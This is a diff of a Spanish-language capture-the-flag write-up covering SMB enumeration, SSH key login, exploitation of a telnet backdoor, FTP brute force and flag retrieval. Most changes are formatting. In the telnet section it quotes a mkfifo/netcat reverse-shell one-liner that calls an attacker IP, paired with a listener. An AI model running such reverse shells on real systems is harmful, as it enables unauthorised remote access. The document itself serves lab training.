@@ -13,6 +13,7 @@ El primer paso consistió en identificar la superficie de ataque y los recursos 
 Utilizamos herramientas como `enum4linux` y `nxc` (NetExec) para identificar grupos de usuarios, la versión del sistema operativo y el nombre de la máquina objetivo.
 
 **Comando ejecutado:**
+
 ```bash
 enum4linux -a 10.66.134.66
 ```
@@ -23,10 +24,13 @@ enum4linux -a 10.66.134.66
 ![Evidencia de Enumeración](Imagen2.png)
 
 información del nombre de maquina
+
 ```bash
 nxc smb 10.66.134.66
 ```
+
 ![Evidencia de Enumeración](Imagen3.png)
+
 ### 1. Enumeración de Recursos Compartidos
 
 **Recursos Compartidos:**  
@@ -104,8 +108,12 @@ Finalmente accedemos al sistema remoto utilizando la llave privada descargada.
 ```bash
 ssh -i id_rsa cactus@10.66.134.66
 ```
+
 ![Evidencia de Enumeración](Imagen4.png)
-### 3. Explotación de Telnet (Backdoor)
+
+---
+
+## 2. Explotación de Telnet (Backdoor)
 
 Tras un escaneo exhaustivo con **nmap** de todos los puertos (`-p-`), detectamos un servicio inusual.
 
@@ -115,7 +123,9 @@ El escaneo reveló un servicio con la huella digital **SKIDY'S BACKDOOR**.
 ```bash
 sudo nmap -sV -p- 10.66.156.114
 ```
+
 ![Evidencia de Enumeración](Imagen5.png)
+
 En el mismo resultado del escaneo, justo antes de la palabra **"BACKDOOR"**, aparece el nombre del usuario: **SKIDY'S**.
 
 - **Usuario identificado:** Skidy
@@ -155,9 +165,12 @@ mkfifo /tmp/mnpazns; nc 192.168.214.133 4444 0</tmp/mnpazns | /bin/sh >/tmp/mnpa
 ```bash
 nc -lvnp 4444
 ```
+
 ![Evidencia de Enumeración](Imagen7.png)
 
-2.	Conectamos por Telnet: **telnet [IP] [PUERTO]**
+2. Conectamos por Telnet:
+
+**telnet [IP] [PUERTO]**
 
 ![Evidencia de Enumeración](Imagen8.png)
 
@@ -172,7 +185,7 @@ Desde ahí procedemos a enumerar el sistema para localizar el archivo **flag.txt
 
 ---
 
-### 4. Ataque de Fuerza Bruta a FTP
+## 3. Ataque de Fuerza Bruta a FTP
 
 Primero realizamos la **enumeración de los puertos abiertos** para identificar si el servicio **FTP** está disponible en el sistema objetivo.
 
@@ -185,6 +198,7 @@ En otro vector de ataque, analizamos el servicio **FTP** para obtener acceso med
 ```bash
 ftp 10.66.179.86
 ```
+
 ![Evidencia de Enumeración](Imagen10.png)
 
 Cuando el servidor solicita credenciales, utilizamos el usuario:
@@ -270,7 +284,7 @@ Contraseña: password
 
 ---
 
-### 5. Post-Explotación
+## 4. Post-Explotación
 
 Una vez obtenidas las credenciales válidas, procedemos a conectarnos nuevamente al servicio **FTP** utilizando el usuario comprometido.
 
@@ -286,19 +300,19 @@ Luego ingresamos las credenciales obtenidas para acceder al servidor y continuar
 
 Una vez dentro del servidor **FTP**, procedemos a enumerar los archivos disponibles en el directorio.
 
-1. **Listamos el contenido del directorio:**
+1. **Listamos el contenido del directorio**
 
 ```
 ftp> ls
 ```
 
-2. **Observamos que existe un archivo llamado:**
+2. **Observamos que existe un archivo llamado**
 
 ```
 ftp.txt
 ```
 
-3. **Descargamos el archivo al directorio de trabajo local:**
+3. **Descargamos el archivo al directorio de trabajo local**
 
 ```
 ftp> get ftp.txt
@@ -313,6 +327,7 @@ Finalmente, una vez descargado el archivo en nuestro sistema, procedemos a visua
 ```bash
 cat ftp.txt
 ```
+
 ![Evidencia de Enumeración](Imagen15.png)
 
 y encontramos la ultima flag del room
